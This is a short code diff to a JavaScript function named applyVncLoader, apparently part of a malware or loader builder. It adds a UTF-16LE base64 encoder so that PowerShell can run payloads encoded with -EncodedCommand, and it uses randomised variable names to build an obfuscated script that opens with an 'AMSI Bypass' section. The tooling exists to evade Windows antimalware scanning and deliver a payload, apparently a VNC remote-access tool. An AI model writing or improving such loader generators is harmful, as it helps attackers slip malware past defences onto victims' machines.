@@ -1321,12 +1321,24 @@ function applyVncLoader(payload) {
     for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * chars.length)];
     return out;
   }
+  // Proper UTF-16LE to base64 encoding for PowerShell
+  function toBase64Unicode(str) {
+    const utf16le = new Uint8Array(str.length * 2);
+    for (let i = 0; i < str.length; i++) {
+      const code = str.charCodeAt(i);
+      utf16le[i * 2] = code & 0xff;
+      utf16le[i * 2 + 1] = code >> 8;
+    }
+    let bin = '';
+    utf16le.forEach(b => bin += String.fromCharCode(b));
+    return btoa(bin);
+  }
   const vAmsiRef = randVar();
   const vAmsiField = randVar();
   const vAmsiSet = randVar();
   const vEnc = randVar();
   const vDecoded = randVar();
-  const vB64 = btoa(unescape(encodeURIComponent(payload)));
+  const vB64 = toBase64Unicode(payload);
 
   return `
 # --- AMSI Bypass ---
